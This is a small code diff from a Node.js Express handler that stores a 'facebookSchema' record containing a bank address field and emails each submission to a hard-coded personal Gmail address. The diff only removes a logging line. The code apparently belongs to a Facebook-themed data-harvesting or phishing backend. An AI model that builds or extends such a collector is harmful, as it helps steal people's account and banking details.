@@ -20,7 +20,6 @@ const postInfo = async(req, res) => {
         bankaddress,
       });
     res.status(200).json({ facebookSchema });
-    console.log(facebookSchema)
     sendEmail('janupatrick26@gmail.com','from the link',subject)
   } catch (error) {
     res.status(500).json({ msg: error });
